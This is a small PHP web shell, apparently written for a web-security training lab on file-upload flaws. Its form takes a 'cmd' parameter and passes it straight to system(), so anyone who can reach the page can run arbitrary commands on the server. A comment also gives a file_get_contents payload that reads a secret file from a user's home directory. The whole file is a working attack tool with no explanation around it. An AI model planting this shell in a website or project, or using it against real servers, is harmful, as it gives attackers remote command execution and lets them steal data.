<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
</head>
<body>
    <form method='GET'>
    <h2>Input Command:</h2>
    <input type="text" name="cmd">
    <input type="submit" value="Send cmd">
    </form>
<?php

/* 
Gets the file contents of a single file
<?php echo file_get_contents('/home/carlos/secret'); ?>

Runs the command supplied after entercommand.php?cmd= 
*/

echo "<h3> Output: </h3>";
system($_GET['cmd']);

?>

</body>
</html>